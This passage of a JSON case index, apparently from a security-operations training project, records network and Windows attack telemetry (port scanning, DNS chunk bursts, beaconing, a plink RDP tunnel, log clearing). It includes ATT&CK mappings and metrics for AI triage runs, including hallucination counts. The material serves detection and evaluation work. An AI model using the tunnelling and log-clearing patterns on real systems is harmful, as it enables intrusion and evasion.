+          "ref": "E030",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:21:12.433434Z",
+          "ts_quality": "original_utc",
+          "summary": "udp 192.168.16.130:51814 -> 192.168.16.1:53 S0",
+          "ref": "E031",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        }
+      ],
+      "event_count_total": 65895,
+      "ai": {
+        "selection_rule": "latest Week-2 analysis with a recorded human review (else latest run)",
+        "runs_total": 6,
+        "runs_reviewed": 2,
+        "final_analysis_id": "AN-20261020-013537-8c86",
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "tokens_per_second": 12.67,
+        "wall_seconds": 110.14,
+        "validator_flags": 2,
+        "validator_severity_counts": {
+          "high": 1,
+          "medium": 1,
+          "low": 0
+        },
+        "review_status": "Corrected",
+        "analyst": "Mohammed Walid",
+        "correct_findings": 1,
+        "incorrect_findings": 1,
+        "hallucinations_recorded": 5,
+        "source": "Week-2/Results/AN-20261020-013537-8c86/analysis.json",
+        "all_runs": [
+          "AN-20261020-011716-3d22",
+          "AN-20261020-013537-8c86",
+          "AN-20261024-134625-cdd2",
+          "AN-20261024-134722-9cb6",
+          "AN-20261024-140121-0f1f",
+          "AN-20261024-140257-3e4e"
+        ]
+      },
+      "human_review": {
+        "status": "Corrected",
+        "analyst": "Mohammed Walid",
+        "source": "Week-2/Results/AN-20261020-013537-8c86/analysis.json"
+      },
+      "tickets": [],
+      "benign_control": false,
+      "limitations": [],
+      "attack": [
+        {
+          "technique": "T1046",
+          "name": "Network Service Discovery",
+          "tactic": "Discovery",
+          "confidence": "observed_pattern",
+          "basis": "Grounded detector NETWORK_VERTICAL_PORT_SCAN; REJ connections across many destination ports (NT-01 case study)"
+        }
+      ],
+      "stage_id": "S1"
+    },
+    {
+      "case_id": "NT-02",
+      "title": "DNS chunk-style query burst",
+      "domain": "network",
+      "source_kind": "dataset_case",
+      "detection_rule": null,
+      "playbook": null,
+      "dataset": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly",
+      "evidence_files": [
+        {
+          "path": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv",
+          "sha256": "e1ecaa96fddb5d44ada967102cd2f3abf947305a21b0b7868255dde5b22dd783"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Case-Study.md",
+          "sha256": "e65dfbd5902af22b8c4e6ed47cfb7b10c7222fc4362ed64229dcb293232eb5f7"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Full-Source-Statistics.json",
+          "sha256": "d692dad937967d2a1f5484b40d0b64564dcbf4e1f5a3742118e3b7c8ae0be604"
+        }
+      ],
+      "facts": {
+        "client_ip": "192.168.16.132",
+        "resolver_ip": "192.168.16.131",
+        "pattern": "chunkNNN-hex.lab.test",
+        "burst_count": 250,
+        "burst_seconds": 3.552866,
+        "zone": "lab.test",
+        "context_values": [
+          "192.168.16.1"
+        ]
+      },
+      "events": [
+        {
+          "ts_original": "2026-05-26T15:56:25.484741Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS AAAA connectivity-check.ubuntu.com 192.168.16.131 -> 192.168.16.1 rcode=-",
+          "ref": "E003",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:01:35.804592Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS AAAA connectivity-check.ubuntu.com 192.168.16.131 -> 192.168.16.1 rcode=-",
+          "ref": "E004",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:03:49.098070Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A portal.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E005",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:03:50.113967Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A mail.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E006",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:03:51.128566Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A update.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E007",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:03:53.158196Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A mail.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E008",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:30.002227Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk001-f137fa53a835cab9745e769d.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E009",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:30.242038Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk017-6814d168efb413495592a30a.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E010",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:30.485056Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk034-20ce2c76b69c7c9b9c46dbe9.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E011",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:30.719552Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk050-34794a1a92aba55a84b23ab2.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E012",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:30.963652Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk067-300a1a1d12c721a19915c978.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E013",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:31.206541Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk084-0cd8bb7ce828a50395bf5328.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E014",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:31.434751Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk100-79e128737488911d9a02ae78.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E015",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:31.673836Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk117-29ce0e62c46f6577e7cdd4cc.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E016",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:31.919584Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk133-b34657f154de097c7c1b01da.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E017",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:32.154706Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk150-abe40348a8dd0c1b937adb0c.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E018",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:32.399095Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk167-62871f01fd6e9380b53795fb.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E019",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:32.623127Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk183-f4df5747aa53924340bcd561.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E020",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:32.862667Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk200-859ef48e43462029ecd421ff.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E021",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:33.082000Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk216-cd05f608e727d855357a48bd.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E022",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:33.320414Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk233-f001b3344bc99da19a864543.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E023",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:05:33.555093Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A chunk250-ef566286fc3a33e1c288d41c.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR",
+          "ref": "E024",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:07:21.154854Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS AAAA ntp.ubuntu.com.localdomain 192.168.16.131 -> 192.168.16.1 rcode=-",
+          "ref": "E025",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T16:11:36.424560Z",
+          "ts_quality": "original_utc",
+          "summary": "DNS A connectivity-check.ubuntu.com 192.168.16.131 -> 192.168.16.1 rcode=-",
+          "ref": "E026",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv"
+        }
+      ],
+      "event_count_total": 581,
+      "ai": {
+        "selection_rule": "latest Week-2 analysis with a recorded human review (else latest run)",
+        "runs_total": 2,
+        "runs_reviewed": 2,
+        "final_analysis_id": "AN-20261020-033312-7c54",
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "tokens_per_second": 13.48,
+        "wall_seconds": 110.19,
+        "validator_flags": 6,
+        "validator_severity_counts": {
+          "high": 2,
+          "medium": 4,
+          "low": 0
+        },
+        "review_status": "Corrected",
+        "analyst": "Mohammed Walid",
+        "correct_findings": 1,
+        "incorrect_findings": 1,
+        "hallucinations_recorded": 1,
+        "source": "Week-2/Results/AN-20261020-033312-7c54/analysis.json",
+        "all_runs": [
+          "AN-20261020-024440-4bee",
+          "AN-20261020-033312-7c54"
+        ]
+      },
+      "human_review": {
+        "status": "Corrected",
+        "analyst": "Mohammed Walid",
+        "source": "Week-2/Results/AN-20261020-033312-7c54/analysis.json"
+      },
+      "tickets": [],
+      "benign_control": false,
+      "limitations": [
+        "authorized lab/test activity unknown",
+        "DNS payload meaning unknown",
+        "NOERROR is not evidence of exfiltration",
+        "Zeek rcode - is not NXDOMAIN",
+        "lab.test is a test-style domain, not confirmed attacker infrastructure"
+      ],
+      "attack": [
+        {
+          "technique": "T1071.004",
+          "name": "Application Layer Protocol: DNS",
+          "tactic": "Command and Control",
+          "confidence": "candidate",
+          "basis": "NETWORK_DNS_CHUNK_BURST: 250 queries in ~3.55 s (NT-02 case study); tunneling/exfiltration NOT established"
+        }
+      ],
+      "stage_id": "S8"
+    },
+    {
+      "case_id": "NT-03",
+      "title": "Periodic HTTP connections to external host",
+      "domain": "network",
+      "source_kind": "dataset_case",
+      "detection_rule": null,
+      "playbook": null,
+      "dataset": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing",
+      "evidence_files": [
+        {
+          "path": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv",
+          "sha256": "026ea56f226ba5e10a729e96ab62ffa6ed1fe82f914e5e561a5a0d96b8352d30"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Case-Study.md",
+          "sha256": "3371ecfe4d56b8e493a2872ece84d6a20a567fdbeac2095859cb62e91a18c735"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Full-Source-Statistics.json",
+          "sha256": "6b80909c7115870c61b947e4ec0fa50f45aaf6cf32f842473b7fb11ce63440a0"
+        }
+      ],
+      "facts": {
+        "src_ip": "192.168.1.199",
+        "dst_ip": "46.101.251.172",
+        "dst_port": 80,
+        "connection_records": 24,
+        "port_reuse_groups": 4
+      },
+      "events": [
+        {
+          "ts_original": "2019-01-10T20:06:29.067208Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59222 -> 46.101.251.172:80 SF bytes 149/171750",
+          "ref": "E003",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:06:30.793723Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59224 -> 46.101.251.172:80 S0 bytes 0/0",
+          "ref": "E004",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:06:37.954878Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59224 -> 46.101.251.172:80 S0 bytes -/-",
+          "ref": "E005",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:06:46.194937Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59224 -> 46.101.251.172:80 S0 bytes -/-",
+          "ref": "E006",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:06:50.932733Z",
+          "ts_quality": "original_utc",
+          "summary": "udp 192.168.1.199:123 -> 94.124.107.190:123 SF bytes 48/48",
+          "ref": "E007",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:07:02.835187Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59224 -> 46.101.251.172:80 SF bytes 149/171878",
+          "ref": "E008",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:07:06.262236Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59228 -> 46.101.251.172:80 S0 bytes 0/0",
+          "ref": "E009",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:07:13.475121Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59228 -> 46.101.251.172:80 S0 bytes -/-",
+          "ref": "E010",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:07:22.035232Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59228 -> 46.101.251.172:80 S0 bytes -/-",
+          "ref": "E011",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:07:38.675241Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59228 -> 46.101.251.172:80 SF bytes 149/141272",
+          "ref": "E012",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:07:42.092044Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:51834 -> 46.101.251.172:23 S1 bytes 639/627",
+          "ref": "E013",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:07:42.115286Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59234 -> 46.101.251.172:80 SF bytes 149/125486",
+          "ref": "E014",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:07:43.599438Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59236 -> 46.101.251.172:80 S0 bytes 0/0",
+          "ref": "E015",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:07:50.835310Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59236 -> 46.101.251.172:80 S0 bytes -/-",
+          "ref": "E016",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:07:59.155315Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59236 -> 46.101.251.172:80 S0 bytes -/-",
+          "ref": "E017",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:08:15.795319Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59236 -> 46.101.251.172:80 S0 bytes -/-",
+          "ref": "E018",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:08:48.435460Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59236 -> 46.101.251.172:80 SF bytes 149/137844",
+          "ref": "E019",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:08:51.136166Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59240 -> 46.101.251.172:80 S0 bytes 0/0",
+          "ref": "E020",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:08:58.355297Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59240 -> 46.101.251.172:80 S0 bytes -/-",
+          "ref": "E021",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:09:06.995369Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59240 -> 46.101.251.172:80 S0 bytes -/-",
+          "ref": "E022",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:09:23.635372Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59240 -> 46.101.251.172:80 SF bytes 149/139570",
+          "ref": "E023",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T20:09:26.859046Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.1.199:59244 -> 46.101.251.172:80 SF bytes 150/149980",
+          "ref": "E024",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-10T22:01:02.953055Z",
+          "ts_quality": "original_utc",
+          "summary": "udp 192.168.1.199:123 -> 81.2.248.189:123 S0 bytes -/-",
+          "ref": "E025",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv"
+        }
+      ],
+      "event_count_total": 237,
+      "ai": {
+        "selection_rule": "latest Week-2 analysis with a recorded human review (else latest run)",
+        "runs_total": 4,
+        "runs_reviewed": 2,
+        "final_analysis_id": "AN-20261021-132533-02e7",
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "tokens_per_second": 11.0,
+        "wall_seconds": 59.42,
+        "validator_flags": 7,
+        "validator_severity_counts": {
+          "high": 0,
+          "medium": 7,
+          "low": 0
+        },
+        "review_status": "Corrected",
+        "analyst": "Mohammed Walid",
+        "correct_findings": 1,
+        "incorrect_findings": 1,
+        "hallucinations_recorded": 1,
+        "source": "Week-2/Results/AN-20261021-132533-02e7/analysis.json",
+        "all_runs": [
+          "AN-20261021-121055-9c32",
+          "AN-20261021-132533-02e7",
+          "AN-20261103-012816-d2f7",
+          "AN-20261103-013010-57df"
+        ]
+      },
+      "human_review": {
+        "status": "Corrected",
+        "analyst": "Mohammed Walid",
+        "source": "Week-2/Results/AN-20261021-132533-02e7/analysis.json"
+      },
+      "tickets": [],
+      "benign_control": false,
+      "limitations": [],
+      "attack": [
+        {
+          "technique": "T1071.001",
+          "name": "Application Layer Protocol: Web Protocols",
+          "tactic": "Command and Control",
+          "confidence": "candidate",
+          "basis": "Repeated TCP/80 connections to 46.101.251.172 with retry pattern (NT-03 verified timeline); attribution not established"
+        }
+      ],
+      "stage_id": "S8"
+    },
+    {
+      "case_id": "RT-01",
+      "title": "plink.exe RDP tunnel",
+      "domain": "network",
+      "source_kind": "dataset_case",
+      "detection_rule": null,
+      "playbook": null,
+      "dataset": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-01-C2",
+      "evidence_files": [
+        {
+          "path": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-01-C2/RT-01-Verified-Timeline.csv",
+          "sha256": "b68d1b22aeff7a2eb0c9e372670b65b0a0a472963019e6bb0a04fb1ab4250d7b"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-01-C2/RT-01-Case-Study.md",
+          "sha256": "b0f2bec328fd3aceb0abf14bb07f61c78cf8161fa2e10f57a01bfc31cd1c3c5b"
+        }
+      ],
+      "facts": {
+        "host": "PC01.example.corp",
+        "tool_path": "C:\\Users\\IEUser\\Desktop\\plink.exe",
+        "destinations": [
+          "10.0.2.18:80",
+          "127.0.0.2:3389"
+        ]
+      },
+      "events": [
+        {
+          "ts_original": "2019-02-16T10:02:21.9344384Z",
+          "ts_quality": "original_utc",
+          "summary": "Event 1 on PC01.example.corp: Sysmon process creation: C:\\Users\\IEUser\\Desktop\\plink.exe",
+          "ref": "E003",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-01-C2/RT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-02-16T10:02:22.9659216Z",
+          "ts_quality": "original_utc",
+          "summary": "Event 3 on PC01.example.corp: Sysmon network connection event: destination 10.0.2.18:80",
+          "ref": "E004",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-01-C2/RT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-02-16T10:02:48.5026416Z",
+          "ts_quality": "original_utc",
+          "summary": "Event 3 on PC01.example.corp: Sysmon network connection event: destination 127.0.0.2:3389",
+          "ref": "E005",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-01-C2/RT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-02-16T10:04:05.0927728Z",
+          "ts_quality": "original_utc",
+          "summary": "Event 3 on PC01.example.corp: Sysmon network connection event: destination 127.0.0.2:3389",
+          "ref": "E023",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-01-C2/RT-01-Verified-Timeline.csv"
+        }
+      ],
+      "event_count_total": 4,
+      "ai": {
+        "selection_rule": "latest Week-2 analysis with a recorded human review (else latest run)",
+        "runs_total": 3,
+        "runs_reviewed": 1,
+        "final_analysis_id": "AN-20261017-222659-f35b",
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "tokens_per_second": 17.7,
+        "wall_seconds": 72.03,
+        "validator_flags": 6,
+        "validator_severity_counts": {
+          "high": 4,
+          "medium": 2,
+          "low": 0
+        },
+        "review_status": "Corrected",
+        "analyst": "Mohammed walid",
+        "correct_findings": 5,
+        "incorrect_findings": 4,
+        "hallucinations_recorded": 4,
+        "source": "Week-2/Results/AN-20261017-222659-f35b/analysis.json",
+        "all_runs": [
+          "AN-20261017-222659-f35b",
+          "AN-20261024-092619-0ea2",
+          "AN-20261024-133457-88cf"
+        ]
+      },
+      "human_review": {
+        "status": "Corrected",
+        "analyst": "Mohammed walid",
+        "source": "Week-2/Results/AN-20261017-222659-f35b/analysis.json"
+      },
+      "tickets": [],
+      "benign_control": false,
+      "limitations": [],
+      "attack": [
+        {
+          "technique": "T1572",
+          "name": "Protocol Tunneling",
+          "tactic": "Command and Control",
+          "confidence": "observed_pattern",
+          "basis": "plink.exe followed by connections to 10.0.2.18:80 and 127.0.0.2:3389 (RT-01 verified timeline)"
+        }
+      ],
+      "stage_id": "S8"
+    },
+    {
+      "case_id": "RT-02",
+      "title": "Security log cleared + share access checks",
+      "domain": "endpoint",
+      "source_kind": "dataset_case",
+      "detection_rule": null,
+      "playbook": null,
+      "dataset": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-02-Discovery",
+      "evidence_files": [
+        {
+          "path": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-02-Discovery/RT-02-Verified-Timeline.csv",
+          "sha256": "db745c5366d57d704695d3e642afb8a1309db6756f862a07b320d23c462d8523"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-02-Discovery/RT-02-Case-Study.md",
+          "sha256": "a22768401b9dfe89112389aa738e68901dca19e31d3c69d7d07e0e3fcfbd5307"
+        }
+      ],
+      "facts": {
+        "host": "WIN-77LTAPHIQ1R.example.corp",
+        "account": "Administrator",
+        "source_ip": "10.0.2.17",
+        "shares": [
+          "winreg",
+          "lsarpc",
+          "srvsvc"
+        ]
+      },
+      "events": [
+        {
+          "ts_original": "2019-01-20T07:29:57.8638931Z",
+          "ts_quality": "original_utc",
+          "summary": "Event 1102 on WIN-77LTAPHIQ1R.example.corp: Windows Security audit log cleared (Event 1102); account: Administrator",
+          "ref": "E001",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-02-Discovery/RT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-20T07:30:10.6451168Z",
+          "ts_quality": "original_utc",
+          "summary": "Event 5145 on WIN-77LTAPHIQ1R.example.corp: Network share access check (Event 5145): winreg, source 10.0.2.17",
+          "ref": "E002",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-02-Discovery/RT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-20T07:30:10.6600994Z",
+          "ts_quality": "original_utc",
